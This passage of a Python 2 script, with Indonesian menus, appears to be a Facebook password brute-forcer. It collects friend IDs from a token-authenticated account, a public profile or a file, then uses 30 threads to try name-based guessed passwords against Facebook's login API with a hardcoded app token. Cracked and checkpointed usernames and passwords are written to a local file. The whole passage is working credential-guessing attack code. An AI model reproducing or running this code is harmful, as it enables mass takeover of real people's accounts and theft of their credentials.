    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone fhilip.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_prancis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;94m _________ \x1b[1;97m   _____\x1b[1;91m___.    '
    print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;91m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;94m /    \\  \\/ \x1b[1;97m\\   __\\ \x1b[1;91m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;94m \\     \\____ \x1b[1;97m|  | \x1b[1;91m  | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;94m  \\______  /.\x1b[1;97m|__|  \x1b[1;91m |___  /'
    print '\x1b[1;94m         \\/         \x1b[1;91m    \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mPrancis\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_prancis()


def pilih_prancis():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_prancis()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________ \x1b[1;97m   _____\x1b[1;91m___.    '
            print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;91m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/ \x1b[1;97m\\   __\\ \x1b[1;91m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____ \x1b[1;97m|  | \x1b[1;91m  | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;94m  \\______  /.\x1b[1;97m|__|  \x1b[1;91m |___  /'
            print '\x1b[1;94m         \\/           \x1b[1;91m  \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK PRANCIS \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________ \x1b[1;97m   _____\x1b[1;91m___.    '
            print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;91m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/ \x1b[1;97m\\   __\\ \x1b[1;91m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____ \x1b[1;97m|  | \x1b[1;91m  | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;94m  \\______  /.\x1b[1;97m|__|  \x1b[1;91m |___  /'
            print '\x1b[1;94m         \\/           \x1b[1;91m  \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK PRANCIS \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_prancis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________ \x1b[1;97m   _____\x1b[1;91m___.    '
            print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;91m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/ \x1b[1;97m\\   __\\ \x1b[1;91m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____ \x1b[1;97m|  | \x1b[1;91m  | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;94m  \\______  /.\x1b[1;97m|__|  \x1b[1;91m |___  /'
            print '\x1b[1;94m         \\/           \x1b[1;91m  \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK PRANCIS \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_prancis()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_prancis()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/prancis.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/prancis.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/prancis.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/prancis.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/prancis.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/prancis.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'pasword'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/prancis.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/prancis.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/prancis.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/prancis.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/prancis.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/prancis.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/prancis.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/prancis.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/prancis.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/prancis.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
